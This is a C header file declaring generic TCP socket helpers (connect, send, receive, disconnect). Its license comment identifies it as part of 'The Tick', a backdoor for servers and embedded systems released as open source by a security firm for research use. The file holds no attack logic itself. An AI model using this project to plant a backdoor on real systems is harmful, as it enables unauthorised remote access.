/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#ifndef TCP_H
#define TCP_H

#include "common.h"

int create_socket(int family);
int connect_socket(int fd, const struct sockaddr *sa, size_t count);
int connect_to_host(const char *hostname, int port);
int send_block(int fd, const char *buf, size_t count);
int recv_block(int sock, char *buf, size_t count);
int consume_extra_data(int fd, size_t count);
void disconnect_tcp(int fd);

#endif /* TCP_H */
